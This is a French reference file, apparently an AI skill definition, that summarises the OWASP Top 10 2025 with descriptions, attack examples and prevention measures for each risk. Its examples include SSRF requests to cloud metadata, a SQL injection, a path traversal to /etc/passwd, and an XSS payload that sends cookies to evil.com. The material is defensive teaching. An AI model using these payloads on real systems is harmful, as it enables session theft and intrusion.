---
name: owasp-overview
description: >
  Référence complète OWASP Top 10 2025 : description, exemples d'attaque, mesures de prévention
  pour chacun des 10 risques critiques des applications web. Utiliser ce skill pour expliquer
  une vulnérabilité, comprendre un risque de sécurité, préparer un cours ou une présentation
  sur la sécurité applicative, ou répondre à toute question sur l'OWASP.
  Mots-clés déclencheurs : OWASP, sécurité, vulnérabilité, injection, XSS, CSRF, authentification,
  contrôle d'accès, cryptographie, misconfiguration, supply chain, SSRF, logging, audit sécurité.
---

# OWASP Top 10 — 2025

> Référence : https://owasp.org/Top10/2025/
> Document de sensibilisation sur les 10 risques de sécurité les plus critiques des applications web.
> Version publiée en janvier 2026.

---

## A01 — Contrôles d'accès défaillants *(Broken Access Control)*

**Rang 2021 → 2025 :** #1 → **#1** | Présent dans 94% des applications testées.
> ⚠️ Le SSRF (ancien A10:2021) est désormais consolidé dans cette catégorie.

### Description
Les utilisateurs peuvent agir en dehors de leurs permissions prévues.
Accès à des données d'autres utilisateurs, modification de données sans autorisation,
élévation de privilèges, manipulation d'URL ou de paramètres.
Inclut également les attaques SSRF où le serveur est forcé à effectuer des requêtes vers des ressources internes.

### Exemples d'attaque
```
# IDOR (Insecure Direct Object Reference)
GET /api/users/1234/documents   ← utilisateur authentifié en tant que #5678
→ accède aux documents de l'utilisateur #1234

# Manipulation d'URL
GET /admin/dashboard  ← utilisateur non-admin accède au panneau admin

# SSRF — forcer le serveur à appeler des ressources internes
GET /fetch?url=http://169.254.169.254/latest/meta-data/   ← AWS metadata
GET /fetch?url=http://localhost:6379   ← Redis interne
```

### Prévention
- Appliquer le **principe du moindre privilège** : refuser par défaut, accorder explicitement
- Vérifier les droits à **chaque requête** (côté serveur, jamais côté client)
- Invalider les sessions après déconnexion côté serveur
- Logger les échecs de contrôle d'accès, alerter sur les répétitions
- Désactiver le listing de répertoires sur le serveur web
- Ne jamais exposer les clés primaires brutes dans les URLs (utiliser des UUID)
- Pour les appels HTTP sortants : valider les URLs contre une **liste blanche** de domaines, bloquer les IPs privées et localhost

---

## A02 — Mauvaises configurations de sécurité *(Security Misconfiguration)*

**Rang 2021 → 2025 :** #5 → **#2** | 90% des applications ont une misconfiguration.

### Description
Configurations par défaut non modifiées, fonctionnalités inutiles activées, erreurs
détaillées exposées, permissions trop larges, headers de sécurité absents.

### Exemples d'attaque
```
# En-têtes HTTP absents
→ Pas de X-Frame-Options → Clickjacking possible
→ Pas de Content-Security-Policy → XSS facilité

# Mode debug activé en production
CI_ENVIRONMENT = development   ← expose les stack traces, chemins, variables

# Credentials par défaut non changés
admin / admin  sur phpMyAdmin, panneaux d'administration

# CORS trop permissif
Access-Control-Allow-Origin: *   ← n'importe quel site peut faire des requêtes
```

### Prévention
- Désactiver le mode debug en production (`CI_ENVIRONMENT = production`)
- Configurer les **headers de sécurité HTTP** : CSP, HSTS, X-Frame-Options, X-Content-Type-Options
- Supprimer les fonctionnalités, docs, exemples inutilisés
- Changer tous les **identifiants par défaut** (BDD, admin, SMTP…)
- Revue de configuration à chaque déploiement
- Automatiser la vérification des configs avec des outils (ex: Mozilla Observatory)

---

## A03 — Défaillances de la chaîne d'approvisionnement *(Software Supply Chain Failures)*

**Rang 2021 → 2025 :** Nouveau (#6 Composants vulnérables élargi) → **#3**

### Description
Utilisation de bibliothèques, frameworks ou composants avec des vulnérabilités connues (CVE),
mais aussi compromission de la chaîne d'approvisionnement elle-même : packages malveillants,
pipelines CI/CD non sécurisés, dépendances transitives non vérifiées, attaques de type
typosquatting ou dependency confusion.

### Exemples d'attaque
```bash
# Dépendances obsolètes avec CVE connues
composer show --outdated   # packages vulnérables en production

# Typosquatting — package malveillant avec un nom proche
composer require codelgniter4/framework   # "l" minuscule au lieu de "I"

# Dependency confusion — package interne remplacé par un public malveillant

# Pipeline CI/CD compromis
# → un attaquant injecte du code dans le pipeline de build
# → le code malveillant est livré en production

# PHP ancien avec failles non patchées
PHP 7.4 → EOL, plus de correctifs de sécurité
```

### Prévention
- Inventorier toutes les dépendances et leurs versions (`composer.lock`)
- Surveiller les CVE : `composer audit`, Dependabot, Snyk
- Mettre à jour régulièrement (patch, minor, major selon urgence sécurité)
- Télécharger les composants uniquement depuis des sources officielles et vérifiées
- Vérifier les **signatures numériques** et checksums des packages
- Sécuriser le pipeline CI/CD : accès restreint, revue de code obligatoire, audit des actions
- Supprimer les dépendances inutilisées
- Utiliser un **dépôt de packages privé** pour les projets sensibles

---

## A04 — Défaillances cryptographiques *(Cryptographic Failures)*

**Rang 2021 → 2025 :** #2 → **#4**

### Description
Mauvaise utilisation (ou absence) de chiffrement pour protéger les données en transit
et au repos. Inclut les algorithmes obsolètes, la mauvaise gestion des clés, HTTP non sécurisé.

### Exemples d'attaque
```php
// ❌ Algorithme obsolète
$strHash = md5($strPassword);        // MD5 cracké en millisecondes
$strHash = sha1($strPassword);       // SHA1 aussi compromis

// ❌ Données sensibles en clair en BDD
INSERT INTO users VALUES ('alice', 'monmotdepasse123');

// ❌ Cookie de session transmis en HTTP (pas HTTPS)
Set-Cookie: session=abc123  // interceptable par MITM
```

### Prévention
- Chiffrer **toutes** les données sensibles au repos (AES-256)
- Utiliser **HTTPS uniquement** (HSTS, redirection HTTP→HTTPS)
- Hacher les mots de passe avec **bcrypt, Argon2 ou scrypt** (jamais MD5/SHA1/SHA256 seul)
- Ne pas mettre en cache les données sensibles
- Désactiver TLS 1.0 et 1.1, utiliser TLS 1.2+ minimum
- Ne jamais stocker de données sensibles inutilement (minimisation)

---

## A05 — Injection *(Injection)*

**Rang 2021 → 2025 :** #3 → **#5** | Inclut le XSS.

### Description
Données non fiables envoyées à un interpréteur (SQL, OS, LDAP, NoSQL, HTML…).
L'attaquant peut lire, modifier, supprimer des données, exécuter des commandes.

### Exemples d'attaque
```php
// ❌ Injection SQL
$strId = $_GET['id'];   // attaquant envoie : 1 OR 1=1 --
$strQuery = "SELECT * FROM users WHERE id = $strId";

// ❌ XSS réfléchi
echo "<p>Bienvenue " . $_GET['name'] . "</p>";
// attaquant envoie : name=<script>document.location='evil.com?c='+document.cookie</script>

// ❌ Injection de commande OS
$strFile = $_GET['file'];
system("cat /uploads/" . $strFile);   // attaquant : ../../etc/passwd
```

### Prévention
- Utiliser des **requêtes paramétrées / prepared statements** (jamais de concaténation SQL)
- Utiliser un **ORM ou Query Builder** (ex: CI4 Query Builder)
- Valider et **filtrer toutes les entrées** côté serveur
- Échapper les sorties HTML (`htmlspecialchars`, `|escape` dans Smarty)
- Limiter les privilèges de compte BDD (pas de DROP/CREATE en production)
- Utiliser une **Content Security Policy (CSP)**

---

## A06 — Conception non sécurisée *(Insecure Design)*

**Rang 2021 → 2025 :** #4 → **#6**

### Description
Défauts architecturaux et de conception, pas uniquement d'implémentation.
Absence de modélisation des menaces, de patterns de sécurité, de limites métier.

### Exemples d'attaque
```
# Pas de limite sur les tentatives de connexion → brute force
# Question secrète pour récupérer un mot de passe (réponse devinable)
# API sans pagination → dump de toute la BDD
# Flux de paiement non sécurisé → manipulation du montant côté client
```

### Prévention
- Intégrer la sécurité **dès la conception** (Secure by Design)
- Faire de la **modélisation des menaces** (threat modeling) sur les fonctionnalités critiques
- Limiter le **nombre de requêtes** (rate limiting) sur les endpoints sensibles
- Définir des **limites métier** (plafonds de commande, vérifications anti-fraude)
- Séparer les environnements (dev/staging/prod) avec des données de test distinctes
- Écrire des **user stories avec critères de sécurité** (cas d'abus)

---

## A07 — Défaillances d'authentification *(Authentication Failures)*

**Rang 2021 → 2025 :** #7 → **#7** | Renommé (suppression de "Identification and").

### Description
Failles dans les mécanismes d'authentification : mots de passe faibles acceptés,
brute force possible, tokens de session prévisibles, gestion du "mot de passe oublié" non sécurisée.

### Exemples d'attaque
```
# Brute force sans limitation
POST /login  →  1000 tentatives/minute sans blocage

# Session non invalidée après déconnexion
Cookie: session=abc123  →  utilisable après logout

# Token de réinitialisation prévisible ou sans expiration
/reset-password?token=12345   ← token séquentiel, valable indéfiniment
```

### Prévention
- Utiliser un framework d'authentification éprouvé (**CI4 Shield**)
- Imposer des **mots de passe forts** (longueur min. 12 caractères, complexité)
- Mettre en place le **MFA** (authentification multi-facteurs) sur les comptes sensibles
- Limiter les tentatives de connexion (**rate limiting, captcha**)
- Invalider toutes les sessions actives après changement de mot de passe
- Les tokens de reset doivent être aléatoires, à usage unique, et expirer (< 15 min)

---

## A08 — Défaillances d'intégrité des données et du logiciel *(Software or Data Integrity Failures)*

**Rang 2021 → 2025 :** #8 → **#8** | Renommé légèrement ("or" au lieu de "and").

### Description
Code et infrastructure ne protègent pas contre les violations d'intégrité :
mises à jour sans vérification de signature, pipelines CI/CD non sécurisés, désérialisation de données non fiables.

### Exemples d'attaque
```php
// ❌ Désérialisation de données utilisateur sans vérification
$objData = unserialize($_COOKIE['data']);   // injection d'objet PHP possible

// ❌ Mise à jour automatique depuis une source non vérifiée
// ❌ Pipeline CI/CD sans contrôle d'accès → injection de code malveillant
```

### Prévention
- Ne jamais désérialiser des données provenant de sources non fiables
- Vérifier les **signatures numériques** des mises à jour logicielles
- Sécuriser le pipeline CI/CD (accès restreint, audit des modifications)
- Utiliser un gestionnaire de dépendances avec vérification d'intégrité (`composer.lock`)
- Revue de code obligatoire avant merge en production

---

## A09 — Défaillances de journalisation et d'alerte *(Security Logging and Alerting Failures)*

**Rang 2021 → 2025 :** #9 → **#9** | Renommé : "Monitoring" → "Alerting".

### Description
Absence de journalisation des événements de sécurité, logs insuffisants ou non surveillés,
absence d'alertes en temps réel sur les anomalies.
Le délai moyen de détection d'une brèche est de **200 jours**.

### Exemples d'attaque
```
# Aucun log des connexions échouées → brute force invisible
# Logs présents mais aucune alerte configurée → intrusion non détectée en temps réel
# Logs stockés dans l'application compromise → effacés par l'attaquant
```

### Prévention
- Logger les **connexions** (succès, échec), modifications de droits, erreurs critiques
- Inclure dans chaque log : timestamp, IP, user ID, action, résultat
- Stocker les logs dans un **système externe** à l'application (non modifiable)
- Mettre en place des **alertes automatiques** sur les anomalies (> X échecs/minute)
- Définir et tester un **plan de réponse aux incidents**
- Conserver les logs suffisamment longtemps (RGPD : durée minimale justifiée)

---

## A10 — Mauvaise gestion des conditions exceptionnelles *(Mishandling of Exceptional Conditions)*

**Rang 2021 → 2025 :** Nouveau → **#10** | Remplace SSRF (désormais dans A01).

### Description
L'application ne gère pas correctement les erreurs, exceptions, états inattendus et conditions
limites. Cela inclut : les messages d'erreur révélant des informations internes, les exceptions
silencieuses masquant des problèmes de sécurité, les états incohérents exploitables, et les
erreurs logiques permettant de contourner des contrôles de sécurité.

### Exemples d'attaque
```php
// ❌ Message d'erreur révèle la structure interne
catch (\Exception $e) {
    echo $e->getMessage();
    // → "SQLSTATE[42S22]: Unknown column 'users.password_hash'"
    // Révèle le nom de la table, des colonnes, le moteur SQL
}

// ❌ Exception silencieuse masquant une faille
try {
    $this->verifySignature($strToken);
} catch (\Exception $e) {
    // rien → la vérification peut être contournée silencieusement
}

// ❌ État incohérent exploitable
// Paiement partiellement validé → commande livrée sans paiement complet

// ❌ Division par zéro / overflow non géré → comportement imprévisible
```

### Prévention
- Ne **jamais exposer** les messages d'exception bruts à l'utilisateur final
- Afficher des messages d'erreur génériques en production, logger le détail en interne
- Ne jamais ignorer silencieusement une exception (catch vide interdit)
- Valider les **états de transition** (workflow de commande, paiement, validation)
- Tester les **cas limites** (valeurs nulles, zéro, négatif, chaînes vides, très grandes valeurs)
- Utiliser un gestionnaire d'erreurs global avec logging systématique
- Définir un comportement **fail-safe** : en cas d'erreur, refuser l'accès plutôt que l'accorder

---

## Résumé rapide

| # | Risque | Impact | Évolution 2021→2025 |
|---|--------|--------|---------------------|
| A01 | Contrôles d'accès défaillants (+ SSRF) | 🔴 Critique | Stable #1, absorbe SSRF |
| A02 | Mauvaise configuration | 🔴 Critique | Monté de #5 |
| A03 | Chaîne d'approvisionnement | 🔴 Critique | **Nouveau** (élargit #6) |
| A04 | Défaillances cryptographiques | 🟠 Élevé | Descendu de #2 |
| A05 | Injection (+ XSS) | 🟠 Élevé | Descendu de #3 |
| A06 | Conception non sécurisée | 🟠 Élevé | Descendu de #4 |
| A07 | Défaillances d'authentification | 🟠 Élevé | Stable #7, renommé |
| A08 | Intégrité données/logiciel | 🟠 Élevé | Stable #8, renommé |
| A09 | Journalisation et alertes | 🟡 Moyen | Stable #9, renommé |
| A10 | Gestion des conditions exceptionnelles | 🟡 Moyen | **Nouveau** (remplace SSRF) |
